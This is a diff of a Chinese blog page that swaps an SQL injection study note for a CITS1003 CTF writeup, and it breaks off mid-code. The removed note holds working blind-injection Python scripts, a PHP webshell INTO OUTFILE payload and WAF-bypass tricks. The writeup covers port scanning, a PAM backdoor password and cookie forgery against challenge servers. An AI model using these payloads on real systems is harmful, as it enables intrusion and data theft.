@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>SQL注入笔记 | 甜筒园</title>
-  <meta name="keywords" content=" sql注入 ">
-  <meta name="description" content="SQL注入笔记 | 甜筒园">
+  <title>CITS1003 CTF wp | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="CITS1003 CTF wp | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="[TOC] WEBezhttpF12看到有注释提示：  访问&#x2F;robots.txt  继续访问&#x2F;l0g1n.txt,拿到用户名密码： username: XYCTF password: @JOILha!wuigqi123$  然后就是一连串组合技，需要对http协议比较熟悉，抓包修改header头或者用hackbar： POST &#x2F;index.php HTTP&#x2F;1.1 Host: xyctf.to">
 <meta property="og:type" content="article">
@@ -632,9 +632,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-SQL注入笔记" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-ctf辅导" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">SQL注入笔记</h1>
+        <h1 class="article-title">CITS1003 CTF wp</h1>
     
     <div class="article-meta">
         
@@ -644,27 +644,20 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="笔记">笔记</a>
+            <a  data-rel="Writeup">Writeup</a>
             
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color1">sql注入</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2024-05-09 16:24:00'>2024-05-09 16:21</time>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-03-22 20:20:59'>2022-03-24 20:17</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>字数:2.3k</span>
+        <span>字数:1.6k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -694,7 +687,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">一、判断注入方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">二、判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5"><span class="toc-text">三、SQL注入基本语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%9B%B2%E6%B3%A8%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">四、盲注的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%A8%A1%E6%9D%BF"><span class="toc-text">布尔盲注模板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E6%A8%A1%E6%9D%BF"><span class="toc-text">时间盲注模板</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-text">五、SQL注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">①注释符号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">②大小写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-text">③内联注释绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-text">④双写关键字绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A4%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">⑤特殊编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A5%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">⑥空格过滤绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A6%E8%BF%87%E6%BB%A4or-and-xor-not-%E7%BB%95%E8%BF%87"><span class="toc-text">⑦过滤or and xor not 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A7%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7-x3D-%E7%BB%95%E8%BF%87"><span class="toc-text">⑧过滤等号&#x3D;绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A8%E8%BF%87%E6%BB%A4%E5%A4%A7%E5%B0%8F%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">⑨过滤大小于号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A9%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">⑩过滤引号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%AA%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">⑪过滤逗号绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%AB%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-text">⑫过滤函数绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81sqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">六、sqlmap工具的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E6%A3%80%E6%9F%A5%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%9A"><span class="toc-text">①检查注入点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E7%88%86%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-text">②爆所有数据库信息：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E7%88%86%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-text">③爆当前数据库信息：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3%E6%8C%87%E5%AE%9A%E5%BA%93%E5%90%8D%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E8%A1%A8"><span class="toc-text">④指定库名列出所有表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A4%E6%8C%87%E5%AE%9A%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5"><span class="toc-text">⑤指定库名表名列出所有字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A5%E6%8C%87%E5%AE%9A%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%AD%97%E6%AE%B5dump%E5%87%BA%E6%8C%87%E5%AE%9A%E5%AD%97%E6%AE%B5"><span class="toc-text">⑥指定库名表名字段dump出指定字段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%E3%80%81handler%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95"><span class="toc-text">七、handler命令与实现方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-text">八、无列名注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">九、预处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E4%BC%A0%E7%BB%9F%E5%A4%84%E7%90%86%EF%BC%9A"><span class="toc-text">MySQL传统处理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%E5%9F%BA%E6%9C%AC%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="toc-text">预处理基本策略：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%B8%A6%E5%8F%82%E6%95%B0%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">不带参数的预处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%8F%82%E6%95%B0%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">带参数的预处理</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CITS1003-CTF"><span class="toc-text">CITS1003 CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Hack-1-Backdoored"><span class="toc-text">Emu Hack #1 - Backdoored</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Caffeinated-Emus"><span class="toc-text">Caffeinated Emus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flightless-Data"><span class="toc-text">Flightless Data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruffled-Feathers"><span class="toc-text">Ruffled Feathers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-in-the-Shell"><span class="toc-text">Emu in the Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Feathered-Forum-Part-1"><span class="toc-text">Feathered Forum - Part 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Apothecary"><span class="toc-text">Emu Apothecary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Advanced-Emu-Standard"><span class="toc-text">Advanced Emu Standard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Cook-Book"><span class="toc-text">Emu Cook Book</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Casino"><span class="toc-text">Emu Casino</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EWT"><span class="toc-text">EWT</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -710,245 +703,192 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>​        学习了这么多天的SQL注入以后，我总结了做SQL注入题的一些方法和思路。</p>
-<h3 id="一、判断注入方式"><a href="#一、判断注入方式" class="headerlink" title="一、判断注入方式"></a>一、判断注入方式</h3><p>常见的注入方式有：</p>
-<p>①字符型注入</p>
-<p>②布尔型注入</p>
-<p>③错误回显注入</p>
-<p>④文件读写注入</p>
-<p>⑤布尔盲注</p>
-<p>⑥时间盲注</p>
-<p>……</p>
-<h3 id="二、判断注入点"><a href="#二、判断注入点" class="headerlink" title="二、判断注入点"></a>二、判断注入点</h3><p>一般有以下注入：</p>
-<p>①GET型注入</p>
-<p>②POST型注入</p>
-<p>③User-Agent:报头文注入</p>
-<p>④Referer:报头文注入</p>
-<p>⑤Cookie:报头文注入</p>
-<h3 id="三、SQL注入基本语句"><a href="#三、SQL注入基本语句" class="headerlink" title="三、SQL注入基本语句"></a>三、SQL注入基本语句</h3><pre><code class="sql">order by 4#
-判断有多少列
-union select 1,2,3#
-判断数据显示点
-union select 1,user(),database()#
-显示出登录用户和数据库名
-普通语句：schema_name——数据库名；table_name——表名；column_name——字段名；
-查询数据库：select schema_name from information_schema.schemata#
-　　　　　　select database()#
-查询数据库表：select table_name from information_schema.tables where table_schema=&#39;数据库名&#39;#
-select sql from sqlite_master#查询创建表shi
-查询字段名：select column_name from infromation_schema.columns where table_name=&#39;表名&#39;#
-查询字段内容：select * from 表名#
-错误回显注入：union select updatexml(1,concat(0x7e,(select user()),0x7e),1)#
-文件读写注入：union select 1,&#39;&lt;?php eval($_REQUEST[23]); ?&gt;&#39;,3 into outfile &#39;var/www/html/1.txt&#39;#
-CREATE DATABASE - 创建新数据库
-ALTER DATABASE - 修改数据库
-CREATE TABLE - 创建新表
-ALTER TABLE - 变更（改变）数据库表
-DROP TABLE - 删除表
-CREATE INDEX - 创建索引（搜索键）
-DROP INDEX - 删除索引
-reverse()-取反函数
-where 字段名 regexp(正则表达式) -正则匹配输出
-load_file()读取根目录下文件
+        <h1 id="CITS1003-CTF"><a href="#CITS1003-CTF" class="headerlink" title="CITS1003 CTF"></a>CITS1003 CTF</h1><p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CITS1003-CTF"><span class="toc-text">CITS1003 CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Hack-1-Backdoored"><span class="toc-text">Emu Hack #1 - Backdoored</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Caffeinated-Emus"><span class="toc-text">Caffeinated Emus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flightless-Data"><span class="toc-text">Flightless Data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruffled-Feathers"><span class="toc-text">Ruffled Feathers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-in-the-Shell"><span class="toc-text">Emu in the Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Feathered-Forum-Part-1"><span class="toc-text">Feathered Forum - Part 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Apothecary"><span class="toc-text">Emu Apothecary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Advanced-Emu-Standard"><span class="toc-text">Advanced Emu Standard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Cook-Book"><span class="toc-text">Emu Cook Book</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Casino"><span class="toc-text">Emu Casino</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EWT"><span class="toc-text">EWT</span></a></li></ol></li></ol></div></p>
+<h2 id="Emu-Hack-1-Backdoored"><a href="#Emu-Hack-1-Backdoored" class="headerlink" title="Emu Hack #1 - Backdoored"></a>Emu Hack #1 - Backdoored</h2><p>根据题目描述，在端口<code>61000</code>到<code>61500</code>之间存在一个后门，使用<code>nmap</code>工具进行端口扫描:</p>
+<pre><code>nmap 34.116.68.59 -p 61000-61550
 </code></pre>
-<h3 id="四、盲注的使用"><a href="#四、盲注的使用" class="headerlink" title="四、盲注的使用"></a>四、盲注的使用</h3><p>​     当我们能够找到注入点，但无法从页面回显中获得我们想要得到的数据库中的数据，这时候我们就需要用到盲注。</p>
-<h4 id="布尔盲注模板"><a href="#布尔盲注模板" class="headerlink" title="布尔盲注模板"></a>布尔盲注模板</h4><pre><code class="python">import requests
-if __name__ == &#39;__main__&#39; :
-    url = &#39;http://8868895d-9164-42b0-a31d-d8ebe2bb0af7.challenge.ctf.show/&#39;
-    result = &#39;&#39;
-    i = 0
-    while True:
-        i = i + 1
-        low = 32
-        high = 127
-        while low &lt; high:
-            mid = (low + high) // 2
-            #payload = f&#39;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#39;
-            #payload = f&#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#39;
-            #payload = f&#39;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagba&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#39;
-            payload = f&#39;if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#39;
-            # print(payload)
-            data=&#123;
-                &quot;uname&quot;:f&quot;admin&#39; and &#123;payload&#125;#&quot;,
-                &quot;passwd&quot;:12346
-            &#125;
-            r = requests.post(url=url,data=data)
-            if &#39;flag.jpg&#39; in r.text:
-                low = mid + 1
-            else:
-                high = mid
-        if low != 32:
-            result += chr(low)
-        else:
-            break
-        print(result)
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png" alt="image-20240427185925654"></p>
+<p>发现在端口<code>61337</code>存在TCP服务，按照题目要求使用<code>nc</code>连接后发送<code>EMU</code>拿到flag</p>
+<pre><code>nc 34.116.68.59 61337
+EMU
 </code></pre>
-<h4 id="时间盲注模板"><a href="#时间盲注模板" class="headerlink" title="时间盲注模板"></a>时间盲注模板</h4><pre><code class="python">import requests
-import time
-if __name__ == &#39;__main__&#39; :
-    url = &#39;http://5317a3cf-d6d2-4441-b598-9593444bfc12.challenge.ctf.show/?id=1&quot;%20and%20&#39;
-    result = &#39;&#39;
-    i = 0
-    while True:
-        i = i + 1
-        low = 32
-        high = 127
-        while low &lt; high:
-            mid = (low + high) // 2
-            #payload = f&#39;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))%23&#39;
-            #payload = f&#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#39;
-            #payload = f&#39;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagugs&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#39;
-            payload = f&#39;if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#39;
-            # print(payload)
-            stime=time.time()
-            r = requests.get(url=url + payload)
-            if time.time()-stime&lt;2:
-                low = mid + 1
-            else:
-                high = mid
-        if low != 32:
-            result += chr(low)
-        else:
-            break
-        print(result)
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427190418683.png" alt="image-20240427190418683"></p>
+<h2 id="Caffeinated-Emus"><a href="#Caffeinated-Emus" class="headerlink" title="Caffeinated Emus"></a>Caffeinated Emus</h2><p>根据提示说图片元数据存在有价值的信息，先右键属性查看没啥特别的：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194602383.png" alt="image-20240427194602383"></p>
+<p>在这个<a target="_blank" rel="noopener" href="https://aperisolve.fr/">网站</a>对图片分析一下，或者用<code>exiftool</code>工具也可以：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194758409.png" alt="image-20240427194758409"></p>
+<p>找到GPS定位信息</p>
+<pre><code>31 deg 27&#39; 59.19&quot; S, 119 deg 29&#39; 0.70&quot; E
 </code></pre>
-<h3 id="五、SQL注入绕过"><a href="#五、SQL注入绕过" class="headerlink" title="五、SQL注入绕过"></a>五、SQL注入绕过</h3><h4 id="①注释符号绕过"><a href="#①注释符号绕过" class="headerlink" title="①注释符号绕过"></a>①注释符号绕过</h4><pre><code class="sql">-- 注释内容
-# 注释内容
-/*注释内容*/
-;
-/x00
+<p>放到<code>google</code>地图里查一下，找到小镇名字<code>Marvel Loch</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427195103342.png" alt="image-20240427195103342"></p>
+<h2 id="Flightless-Data"><a href="#Flightless-Data" class="headerlink" title="Flightless Data"></a>Flightless Data</h2><p>根据提示是<code>steghide</code>工具的使用</p>
+<p>查看附件<code>email.html</code>，里面有一张<code>jpg</code>图片和一个密码，直接使用改工具进行文件提取:</p>
+<pre><code>steghide extract -sf 111.jpg
 </code></pre>
-<h4 id="②大小写绕过"><a href="#②大小写绕过" class="headerlink" title="②大小写绕过"></a>②大小写绕过</h4><p>常用于 <code>waf</code>的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br>例如：waf过滤了关键字<code>select</code>，可以尝试使用<code>Select</code>等绕过。</p>
-<h4 id="③内联注释绕过"><a href="#③内联注释绕过" class="headerlink" title="③内联注释绕过"></a>③内联注释绕过</h4><p>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
-<h4 id="④双写关键字绕过"><a href="#④双写关键字绕过" class="headerlink" title="④双写关键字绕过"></a>④双写关键字绕过</h4><p>在某一些简单的<code>waf</code>中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</p>
-<h4 id="⑤特殊编码绕过"><a href="#⑤特殊编码绕过" class="headerlink" title="⑤特殊编码绕过"></a>⑤特殊编码绕过</h4><p>·十六进制绕过</p>
-<p>·ascii编码绕过</p>
-<h4 id="⑥空格过滤绕过"><a href="#⑥空格过滤绕过" class="headerlink" title="⑥空格过滤绕过"></a>⑥空格过滤绕过</h4><pre><code class="sql">/**/
-()
-回车(url编码中的%0a)
-`(tap键上面的按钮)
-tap
-两个空格
+<p>回车后输入密码：</p>
+<pre><code>theEMusWiLLRoOld3w0oRlD
 </code></pre>
-<h4 id="⑦过滤or-and-xor-not-绕过"><a href="#⑦过滤or-and-xor-not-绕过" class="headerlink" title="⑦过滤or and xor not 绕过"></a>⑦过滤or and xor not 绕过</h4><pre><code class="sql">and = &amp;&amp;
-or = ||
-xor = | # 异或
-not = !
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200212033.png" alt="image-20240427200212033"></p>
+<p>查看<code>secret.txt</code>拿到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200237861.png" alt="image-20240427200237861"></p>
+<h2 id="Ruffled-Feathers"><a href="#Ruffled-Feathers" class="headerlink" title="Ruffled Feathers"></a>Ruffled Feathers</h2><p>题目要求是修复PDF,看提示说什么Length,网上查了一下length的计算方法：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205355895.png" alt="image-20240427205355895"></p>
+<p>还有正常<code>PDF</code>的格式大致为：</p>
+<p><img src="C:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240427205446268.png" alt="image-20240427205446268"></p>
+<p>查看附件内容</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205546918.png" alt="image-20240427205546918"></p>
+<p>这里有个<code>Current</code>很莫名其妙，估计是改这里，再算一下length长度：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205715007.png" alt="image-20240427205715007"></p>
+<p>正好是272个字节，确定是改这里没毛病了。用<code>Notepad++</code>打开PDF进行修改，将第五行内容进行替换：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205814892.png" alt="image-20240427205814892"></p>
+<p>保存后重新打开文件看到flag图片：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205854735.png" alt="image-20240427205854735"></p>
+<p>&#x3D;&#x3D;非预期解法：&#x3D;&#x3D;</p>
+<p>发现<code>jpg</code>文件头：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210020443.png" alt="image-20240427210020443"></p>
+<p>直接将前面所有字节删掉，保存后将文件后缀修改为为<code>jpg</code>打开拿到图片</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210136578.png" alt="image-20240427210136578"></p>
+<h2 id="Emu-in-the-Shell"><a href="#Emu-in-the-Shell" class="headerlink" title="Emu in the Shell"></a>Emu in the Shell</h2><p>使用<code>ssh</code>连接到服务器：</p>
+<pre><code>ssh -p 2022 ir-account@34.87.251.234
 </code></pre>
-<h4 id="⑧过滤等号-x3D-绕过"><a href="#⑧过滤等号-x3D-绕过" class="headerlink" title="⑧过滤等号&#x3D;绕过"></a>⑧过滤等号&#x3D;绕过</h4><p>·不加<code>通配符</code>的<code>like</code>执行的效果和<code>=</code>一致，所以可以用来绕过。</p>
-<p>·rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>用来取代<code>=</code>时，<code>rlike</code>的用法和上面的<code>like</code>一样，没有通配符效果和<code>=</code>一样</p>
-<p>·regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</p>
-<p>·使用大小于号来绕过</p>
-<p>·&lt;&gt; 等价于 !&#x3D; 所以在前面再加一个<code>!</code>结果就是等号了</p>
-<h4 id="⑨过滤大小于号绕过"><a href="#⑨过滤大小于号绕过" class="headerlink" title="⑨过滤大小于号绕过"></a>⑨过滤大小于号绕过</h4><p>·greatest(n1, n2, n3…):返回n中的最大值</p>
-<p>·least(n1,n2,n3…):返回n中的最小值</p>
-<p>·strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 ·in关键字</p>
-<p>·between a and b:范围在a-b之间</p>
-<h4 id="⑩过滤引号绕过"><a href="#⑩过滤引号绕过" class="headerlink" title="⑩过滤引号绕过"></a>⑩过滤引号绕过</h4><p>·使用十六进制</p>
-<pre><code class="sql">select column_name  from information_schema.tables where table_name=0x7573657273;
+<p>根据提示进入<code>/lib/x86_64-linux-gnu/security/</code>目录查看文件修改时间：</p>
+<pre><code>ls -al
 </code></pre>
-<p>·使用宽字节</p>
-<p>常用在web应用使用的字符集为<code>GBK</code>时，并且过滤了引号，就可以试试宽字节。</p>
-<pre><code class="sql"># 过滤单引号时
-%bf%27 %df%27 %aa%27
-%df\’ = %df%5c%27=縗’
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427215222685.png" alt="image-20240427215222685"></p>
+<p>发现<code>pam_unix.so</code>最近有修改记录，最可疑，将该文件下载到本地用<code>IDA</code>分析：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230728660.png" alt="image-20240427230728660"></p>
+<p>看这个长得很像密码的样子，试试用该密码登录<code>emu-haxor</code></p>
+<pre><code>su emu-haxor
+Password: pUpPet_m4sT3r
 </code></pre>
-<h4 id="⑪过滤逗号绕过"><a href="#⑪过滤逗号绕过" class="headerlink" title="⑪过滤逗号绕过"></a>⑪过滤逗号绕过</h4><p>如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用<code>from pos for len</code>，其中pos代表从pos个开始读取len长度的子串<br>例如在<code>substr()</code>等函数中，常规的写法是</p>
-<pre><code class="sql">select substr(&quot;string&quot;,1,3);
+<p>成功登录，在<code>home/emu-haxor/flag.txt</code>拿到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230941388.png" alt="image-20240427230941388"></p>
+<h2 id="Feathered-Forum-Part-1"><a href="#Feathered-Forum-Part-1" class="headerlink" title="Feathered Forum - Part 1"></a>Feathered Forum - Part 1</h2><p>附件给出页面源代码，想要访问<code>/forum</code>路由需要对<code>auth_required</code>函数进行绕过。对该函数源码进行分析：</p>
+<pre><code class="python">def auth_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        emu_usernames = [account[&quot;username&quot;] for account in EMU_USERS_ACCOUNTS]
+        # Just check that the &quot;username&quot; cookie matches an existing user
+        if not request.cookies.get(&#39;username&#39;, None) in emu_usernames:
+            return redirect(url_for(&#39;index&#39;))
+        return f(*args, **kwargs)
+    return decorated_function
 </code></pre>
-<p>如果过滤了逗号，可以这样使用<code>from pos for len</code>来取代</p>
-<pre><code class="sql">select substr(&quot;string&quot; from 1 for 3);
-在学习大佬wp时还看到利用join绕过逗号过滤，tql
+<p>发现只要<code>cookie</code>中的<code>username</code>的值在<code>EMU_USERS_ACCOUNTS</code>即可，这样我们就可以伪造一个cookie进行访问：</p>
+<pre><code>GET /forum
 
-?id=-1&#39; union select 1,2,3--+
+Cookie: username=BeakMaster
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427232027952.png" alt="image-20240427232027952"></p>
+<h2 id="Emu-Apothecary"><a href="#Emu-Apothecary" class="headerlink" title="Emu Apothecary"></a>Emu Apothecary</h2><p>拿到题目源码，已知使用了<code>ejs</code>模板，在<code>index.js</code>进行传参传递给<code>polluteme.js</code>。对<code>polluteme.js</code>中的关键代码进行分析：</p>
+<pre><code class="js">for (const key in userInput) &#123;
+    // Input is in the format of `&#123;ingredientName&#125;.&#123;attribute&#125;`
+    if (!key.includes(&quot;.&quot;)) continue
+    // Split the key name by the &#39;.&#39; character
+    const split = key.split(&#39;.&#39;)
+    // Set the attribute for the ingredient by the first two dots
